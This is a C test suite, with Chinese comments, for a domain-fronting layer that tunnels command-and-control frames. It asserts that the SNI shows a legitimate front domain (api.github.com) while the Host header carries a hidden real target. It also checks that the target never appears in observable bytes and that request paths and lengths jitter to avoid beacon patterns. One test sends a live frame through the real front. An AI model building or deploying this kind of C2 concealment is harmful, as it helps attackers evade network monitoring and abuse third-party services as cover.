/* test_front.c — 域前置层
 *
 * 核心验收不是"能连上"，而是三件事：
 *   1. SNI（前置域）与 HTTP Host（真实目标）是两个不同的值，缺一不可
 *   2. 真实目标主机名不出现在加密前的字节里
 *   3. 请求路径在前置域允许的 prefix 内，且长度/形态逐次不同
 */
#ifndef _POSIX_C_SOURCE
#define _POSIX_C_SOURCE 200809L
#endif
#include "front.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

static int fails = 0, total = 0;
#define CHECK(cond, name) do { \
    total++; \
    if (cond) printf("[PASS] %s\n", name); \
    else { printf("[FAIL] %s\n", name); fails++; } \
} while (0)

#define FRONT_DOMAIN "api.github.com"     /* 本沙盒可达的前置域 */
#define REAL_HOST    "c2-real-target.invalid"
#define CA           "/etc/zeroproxy-tls/ca-bundle.pem"

typedef struct {
    int fd;
    uint8_t sent[8192];
    size_t  sent_len;
} io_ctx;

/* mock 回调：不联网的用例用它，永不真正调用 */
static int mock_send(void *arg, const uint8_t *d, size_t n) {
    io_ctx *c = (io_ctx *)arg;
    if (c->sent_len + n < sizeof(c->sent)) {
        memcpy(c->sent + c->sent_len, d, n);
        c->sent_len += n;
    }
    return (int)n;
}
static int mock_recv(void *arg, uint8_t *b, size_t cap) {
    (void)arg; (void)b; (void)cap;
    return -1;
}

static int sock_send(void *arg, const uint8_t *d, size_t n) {
    io_ctx *c = (io_ctx *)arg;
    ssize_t r = send(c->fd, d, n, 0);
    if (r <= 0) return -1;
    if (c->sent_len + (size_t)r < sizeof(c->sent)) {
        memcpy(c->sent + c->sent_len, d, (size_t)r);
        c->sent_len += (size_t)r;
    }
    return (int)r;
}
static int sock_recv(void *arg, uint8_t *b, size_t cap) {
    io_ctx *c = (io_ctx *)arg;
    return (int)recv(c->fd, b, cap, 0);
}

static int tcp_connect(const char *host) {
    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, "443", &hints, &res) != 0) return -1;
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) { freeaddrinfo(res); return -1; }
    struct timeval tv = { .tv_sec = 10, .tv_usec = 0 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    if (connect(fd, res->ai_addr, res->ai_addrlen) != 0) {
        close(fd); freeaddrinfo(res); return -1;
    }
    freeaddrinfo(res);
    return fd;
}

static void t_config(void) {
    io_ctx io; memset(&io, 0, sizeof(io));
    front_ctx *c = NULL;

    front_config bad; memset(&bad, 0, sizeof(bad));
    bad.front_domain = FRONT_DOMAIN;            /* 故意不给 real_host */
    CHECK(front_init(&c, &bad, mock_send, mock_recv, &io) == FRONT_ERR_ARG,
          "缺真实目标主机名被拒（不允许回退成同一个域）");

    front_config bad2; memset(&bad2, 0, sizeof(bad2));
    bad2.real_host = REAL_HOST;                 /* 故意不给 front_domain */
    CHECK(front_init(&c, &bad2, mock_send, mock_recv, &io) == FRONT_ERR_ARG,
          "缺前置域被拒");
}

static void t_request_shape(void) {
    io_ctx io; memset(&io, 0, sizeof(io));
    front_ctx *c = NULL;
    front_config cfg; memset(&cfg, 0, sizeof(cfg));
    cfg.front_domain = FRONT_DOMAIN;
    cfg.real_host    = REAL_HOST;
    cfg.path_prefix  = "/api/v1/";
    cfg.rng_seed     = 12345;                   /* 确定性，便于断言分布 */

    CHECK(front_init(&c, &cfg, mock_send, mock_recv, &io) == FRONT_OK, "初始化成功");

    uint8_t req[4096];
    size_t rlen = 0;
    const uint8_t frame[64] = { 0xda, 0x1a, 0x01, 0x02 };
    CHECK(front_build_request(c, frame, sizeof(frame), req, sizeof(req), &rlen) == FRONT_OK,
          "构造请求成功");

    /* Host 必须是真实目标，不是前置域 */
    char hostline[512];
    const char *h = strstr((const char *)req, "Host: ");
    if (h) {
        size_t i = 0;
        h += 6;
        while (*h && *h != '\r' && i + 1 < sizeof(hostline)) hostline[i++] = *h++;
        hostline[i] = '\0';
    } else hostline[0] = '\0';
    CHECK(strcmp(hostline, REAL_HOST) == 0, "Host 头是真实目标而非前置域");
    CHECK(strncmp((const char *)req, "POST /api/v1/", 13) == 0, "路径在前置域允许的 prefix 内");

    /* 帧透传：body 原样出现在请求末尾 */
    CHECK(rlen > sizeof(frame) && memcmp(req + (rlen - sizeof(frame)), frame, sizeof(frame)) == 0,
          "C2 帧原样透传");

    /* 未连接不能发 */
    CHECK(front_send(c, frame, sizeof(frame)) == FRONT_ERR_STATE, "未连接时 send 被拒");

    /* 路径抖动：多次构造，路径互不相同且都在 prefix 内 */
    char p1[128], p2[128], p3[128];
    int distinct = 0, in_prefix = 1;
    size_t lens[8];
    front_build_request(c, frame, 4, req, sizeof(req), &rlen); front_last_path(c, p1, sizeof(p1));
    front_build_request(c, frame, 4, req, sizeof(req), &rlen); front_last_path(c, p2, sizeof(p2));
    front_build_request(c, frame, 4, req, sizeof(req), &rlen); front_last_path(c, p3, sizeof(p3));
    distinct = (strcmp(p1, p2) != 0) && (strcmp(p2, p3) != 0) && (strcmp(p1, p3) != 0);
    CHECK(distinct, "多次请求路径互不相同");
    CHECK(strncmp(p1, "/api/v1/", 8) == 0 && strncmp(p2, "/api/v1/", 8) == 0
          && strncmp(p3, "/api/v1/", 8) == 0 && in_prefix, "抖动后仍落在 prefix 内（否则会被前置 403）");

    int vary = 0;
    for (int i = 0; i < 8; i++) {
        front_build_request(c, frame, 4, req, sizeof(req), &rlen);
        char p[128]; front_last_path(c, p, sizeof(p));
        lens[i] = strlen(p);
    }
    for (int i = 1; i < 8; i++) if (lens[i] != lens[0]) { vary = 1; break; }
    CHECK(vary, "路径长度有抖动（不形成等长请求节拍）");

    front_free(c);
}

static void t_real_fronting(void) {
    int fd = tcp_connect(FRONT_DOMAIN);
    if (fd < 0) { printf("[SKIP] 无法连接前置域 %s:443\n", FRONT_DOMAIN); return; }
    io_ctx io; memset(&io, 0, sizeof(io)); io.fd = fd;

    front_ctx *c = NULL;
    front_config cfg; memset(&cfg, 0, sizeof(cfg));
    cfg.front_domain = FRONT_DOMAIN;
    cfg.real_host    = REAL_HOST;
    cfg.path_prefix  = "/";
    cfg.ca_path      = CA;
    cfg.verify       = 1;

    if (front_init(&c, &cfg, sock_send, sock_recv, &io) != FRONT_OK) {
        printf("[SKIP] front_init 失败\n"); close(fd); return;
    }
    front_err fe = front_connect(c);
    printf("[INFO] front_connect: %s\n", front_errstr(fe));
    CHECK(fe == FRONT_OK, "经前置域完成真实 TLS 握手");

    if (fe == FRONT_OK) {
        const uint8_t frame[32] = { 'D','J','F','R', 0x01, 0x02 };
        CHECK(front_send(c, frame, sizeof(frame)) == FRONT_OK, "经前置域发出一帧");

        /* 取证：加密前的字节里能看到前置域（SNI 明文），看不到真实目标 */
        int has_front = 0, has_real = 0;
        for (size_t i = 0; i + strlen(FRONT_DOMAIN) < io.sent_len; i++)
            if (!memcmp(io.sent + i, FRONT_DOMAIN, strlen(FRONT_DOMAIN))) { has_front = 1; break; }
        for (size_t i = 0; i + strlen(REAL_HOST) < io.sent_len; i++)
            if (!memcmp(io.sent + i, REAL_HOST, strlen(REAL_HOST))) { has_real = 1; break; }
        CHECK(has_front == 1, "前置域以 SNI 明文出现（观察者所见）");
        CHECK(has_real == 0, "真实目标不出现在加密前字节中（观察者不可见）");
        printf("[INFO] 共发出 %zu 字节\n", io.sent_len);
    }
    front_free(c);
    close(fd);
}

int main(void) {
    t_config();
    t_request_shape();
    t_real_fronting();
    printf("\n=== %d/%d passed ===\n", total - fails, total);
    return fails == 0 ? 0 : 1;
}
